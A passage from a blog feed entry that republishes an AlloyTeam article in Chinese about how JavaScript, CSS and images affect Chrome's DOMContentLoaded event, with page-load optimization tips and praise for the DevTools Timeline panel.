<p>非常令人惊讶，在有JS而没有CSS的页面中，img居然能够在收到数据后就立刻开始解码、绘图（paint)，也就是说，JS并没有阻塞img的展现！这跟我们以前理解的JS会阻塞img资源的传统观念不太一样，看来Chrome对img的加载和展现做了新的优化。</p>
<p>##</p>
<p>我们常用的jQuery的 <code>$(document).ready()</code> 方法，就是对DOMContentLoaded事件的监听（当然，其内部还会通过模拟DOMContentLoaded事件和监听onload事件来提供降级方案）。通常推荐在DOMContentLoaded事件触发的时候为DOM元素注册事件。所以尽快的让DOMContentLoaded事件触发，就意味着能够尽快让页面可交互：</p>
<ol>
<li>减小CSS文件体积，把单个CSS文件分成几个文件以并行加载，减少CSS对JS的阻塞时间</li>
<li>次要的JS文件，通过动态插入script标签来加载（动态插入的script标签不阻塞DOMContentLoaded事件的触发）</li>
<li>CSS中使用的精灵图，可以利用对img的预加载，放在html中跟CSS文件一起加载</li>
</ol>
<p>在做实验的过程中，感觉Chrome开发者工具的Timeline面板非常强大，浏览器的一举一动都记录下来。以前我们前端开发要想理解、探索浏览器的内部行为，或者摸着石头过河的做黑盒测试，或者事倍功半的研究浏览器源码，唯一高效点的做法就是学习别人的研究经验，看老外的文章，但浏览器的发展日新月异（比如这次实验发现的JS不阻塞img的展现），别人的经验始终不是最新、最适合的，关键是要结合自己的业务、需求场景，有针对性的做分析和优化。</p>
<p>##</p>
<p>PS.</p>
<p>以上测试环境为windows/chrome，并用Fiddler模拟慢速网络</p>
<p>原创文章转载请注明：</p>
<p>转载自AlloyTeam：<a href="http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/" target="_blank" rel="external">http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;JS、CSS以及img对DOMContentLoaded事件的影响&quot;&gt;&lt;a href=&quot;#JS、CSS以及img对DOMContentLoaded事件的影响&quot; class=&quot;headerlink&quot; title=&quot;JS、CSS以及img对DOMContentLoad
    
    </summary>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/categories/Web/"/>
    
    
      <category term="DOMContentLoaded" scheme="http://www.wanglinzhizhi.me/tags/DOMContentLoaded/"/>
    
      <category term="浏览器内核" scheme="http://www.wanglinzhizhi.me/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8/"/>
    
      <category term="Web" scheme="http://www.wanglinzhizhi.me/tags/Web/"/>
    
  </entry>
  
</feed>
